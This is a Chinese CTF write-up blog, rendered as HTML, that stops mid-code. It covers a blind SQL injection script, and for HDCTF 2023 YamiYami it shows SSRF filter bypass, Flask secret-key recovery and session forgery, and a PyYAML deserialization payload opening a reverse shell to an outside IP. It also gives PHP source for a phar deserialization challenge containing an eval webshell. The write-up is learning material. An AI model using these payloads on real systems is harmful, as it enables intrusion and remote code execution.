class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node5.anna.nssctf.cn:28905/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">min</span>&lt;<span class="built_in">max</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        payload = <span class="string">&quot;tarnish&#x27;&amp;&amp;(ascii(substr((select/**/group_concat(flag)/**/from/**/flag),&#123;&#125;,1))&gt;&#123;&#125;)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url= url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">min</span>=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span>=mid</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">min</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;700253f7-9510-4244-a934-a68ed47bbff4&#125;</span><br></pre></td></tr></table></figure><h2 id="HDCTF-2023-YamiYami"><a href="#HDCTF-2023-YamiYami" class="headerlink" title="[HDCTF 2023]YamiYami"></a>[HDCTF 2023]YamiYami</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204183506892.png" alt="image-20241204183506892"></p><p>打开发现有三个功能点，第一个是ssrf一样的存在，第二个是上传文件，第三个是pwd</p><p>先测一下第一个</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204183619864.png" alt="image-20241204183619864"></p><p>ok那读一下源码嘛！</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204183641915.png" alt="image-20241204183641915"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.*</span><br></pre></td></tr></table></figure><p>被过滤了！！！二次url编码来绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28466/read?url=file:///%2561pp/%2561pp.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re, random, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> yaml <span class="comment">#问题所在 pyyaml反序列化</span></span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">False</span></span><br><span class="line">BLACK_LIST = [<span class="string">&quot;yaml&quot;</span>, <span class="string">&quot;YAML&quot;</span>, <span class="string">&quot;YML&quot;</span>, <span class="string">&quot;yml&quot;</span>, <span class="string">&quot;yamiyami&quot;</span>]</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&quot;/app/uploads&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;passport&#x27;</span>] = <span class="string">&#x27;YamiYami&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Welcome to HDCTF2023 &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Enjoy it &lt;a href=&quot;/pwd&quot;&gt;pwd&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pwd&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwd</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(pwdpath)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        <span class="keyword">if</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        res = urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">for</span> blackstr <span class="keyword">in</span> BLACK_LIST:</span><br><span class="line">        <span class="keyword">if</span> blackstr <span class="keyword">in</span> filename:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            flash(<span class="string">&#x27;No file part&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Empty file&quot;</span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./uploads/&#x27;</span>):</span><br><span class="line">                os.makedirs(<span class="string">&#x27;./uploads/&#x27;</span>)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>) == <span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile = request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwdpath = os.popen(<span class="string">&quot;pwd&quot;</span>).read()</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里多了一个路由，我怎么感觉除了pwd，其他三个路由都有洞啊！！！</p><p>&#x2F;read可能直接读取到flag，这里有个非预期，直接读file:&#x2F;&#x2F;&#x2F;proc&#x2F;1&#x2F;environ直接出了flag</p><p>&#x2F;upload中有os.path.join，可能造成绝对路径拼接漏洞！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">绝对路径拼接漏洞</span><br><span class="line"></span><br><span class="line">os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。</span><br><span class="line"></span><br><span class="line">然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径</span><br></pre></td></tr></table></figure><p>如果flag在根目录下且名称知道，那么就拿下了</p><p><strong>但是</strong>，由于此处存在secure_filename函数，所以就不行啦！！</p><p>再看看&#x2F;boogipop路由，yaml.full_load(f)，可能存在PyYaml反序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>) == <span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile = request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br></pre></td></tr></table></figure><p>首先这里我们面临的是session伪造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = str(random.random() * 233)</span><br></pre></td></tr></table></figure><p>注意看这里的uuid.getnode()，<code>uuid.getnode()</code> 返回计算机的<strong>网络接口卡（NIC）地址</strong>，通常是设备的 MAC 地址。</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204190138226.png" alt="image-20241204190138226" style="zoom:80%;" /><p>尝试一下读取file:&#x2F;&#x2F;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p><p>成功读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">02:42:ac:02:53:60 </span><br></pre></td></tr></table></figure><p>那接下来我们用python跑一下secret_key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">random.seed(<span class="number">0x0242ac025360</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(random.random() * <span class="number">233</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#186.07856094331362</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJwYXNzcG9ydCI6IllhbWlZYW1pIn0.Z1A35A.Asx0C_ayFAFrjis7qY4WWiXNYEU</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204191236394.png" alt="image-20241204191236394"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.Z1A5HQ.XcVLAuoOz8HI6SqclVREZ0FH3dE</span><br></pre></td></tr></table></figure><p>&#x2F;boogipop路由下干的其实就是接收一个file，然后它会去查看是否存在，若存在则yaml.full_load<br>所以我们要先去上传一个恶意的yaml文件</p><p>由于这里是full_load()</p><p>我们要想办法去突破，用extend方法试试反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">!!python/object/new:type</span><br><span class="line">args:</span><br><span class="line">  - exp</span><br><span class="line">  - !!python/tuple []</span><br><span class="line">  - &#123;&quot;extend&quot;: !!python/name:exec &#125;</span><br><span class="line">listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1\&quot;&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>这里我们创建一个1.txt就好了，其他后缀都被过滤了</p><p>上传到&#x2F;uploads&#x2F;1.txt</p><p>然后到&#x2F;boogipop路由下进行反序列化即可，这里注意改session</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204191947252.png" alt="image-20241204191947252" style="zoom:80%;" /><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204192022368.png" alt="image-20241204192022368"></p><p>知识点挺多的，还是非常适合学习的！！</p><h2 id="SWPUCTF-2021-新生赛-babyunser"><a href="#SWPUCTF-2021-新生赛-babyunser" class="headerlink" title="[SWPUCTF 2021 新生赛]babyunser"></a>[SWPUCTF 2021 新生赛]babyunser</h2><p>打开就两个功能点</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205101557977.png" alt="image-20241205101557977" style="zoom:80%;" /><p>一个上传文件，一个查看文件</p><p>根据题目就知道与反序列化有关，php架构，猜测为phar反序列化。</p><p>先扫目录看看</p><p>没有什么有价值的。</p><p>那么看看查看文件这个功能点，可能和任意文件读取有关</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205102042424.png" alt="image-20241205102042424" style="zoom: 80%;" /><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">include(&#x27;class.php&#x27;);</span></span><br><span class="line"><span class="meta">$a=new aa();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>aa的文件查看器<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;search_form&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;input_text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入搜索内容&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;查看&quot;</span> <span class="attr">class</span>=<span class="string">&quot;input_sub&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">error_reporting(0);</span></span><br><span class="line"><span class="meta">$filename=$_POST[&#x27;file&#x27;];</span></span><br><span class="line"><span class="meta">if(!isset($filename))&#123;</span></span><br><span class="line"><span class="meta">    die();</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">$file=new zz($filename);</span></span><br><span class="line"><span class="meta">$contents=$file-&gt;getFile();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">&quot;file_content&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=&lt;?<span class="attr">php</span> <span class="attr">echo</span> &quot;&lt;<span class="attr">br</span>&gt;</span>&quot;.$contents;?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>里面包含了class.php，那么我们再读取一下class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;aa&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="string">&quot;\&lt;?php @eval(\$_POST[1]);?&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;func&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">zz</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27;surprise&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/|php:|data|zip|\.\.\//i&#x27;</span>,<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;这不合理&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filename</span>=<span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">        <span class="variable">$lt</span>=<span class="variable language_">$this</span>-&gt;filename-&gt;<span class="variable">$var</span>;</span><br><span class="line">        <span class="comment">//此功能废弃，不想写了</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filter</span>();</span><br><span class="line">        <span class="variable">$contents</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$contents</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;404 not found&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>]&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;content;</span><br><span class="line">    &#125;</span><br><span 